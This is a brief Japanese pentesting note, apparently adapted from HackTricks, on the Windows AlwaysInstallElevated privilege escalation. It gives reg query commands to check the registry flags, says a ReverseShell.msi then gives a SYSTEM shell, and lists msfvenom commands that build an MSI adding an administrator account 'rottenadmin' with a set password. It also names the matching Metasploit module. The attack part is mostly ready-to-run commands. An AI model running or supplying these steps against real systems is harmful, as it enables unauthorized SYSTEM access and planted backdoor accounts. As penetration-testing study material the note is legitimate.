```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
これら 2 つのレジスタが**有効になっている****場合**(値が**0x1** )、どの権限のユーザーでもNT AUTHORITY\ **SYSTEMとしてファイル****をインストール**(実行)できます。`*.msi`

つまりReverseShell.msiなどを実行するとSystem権限でShellを取得できる

# [Metasploit payloads](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#metasploit-payloads)

```cmd
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```

メータープレターセッションがある場合は、モジュールを使用してこのテクニックを自動化できます。**`exploit/windows/local/always_install_elevated`**

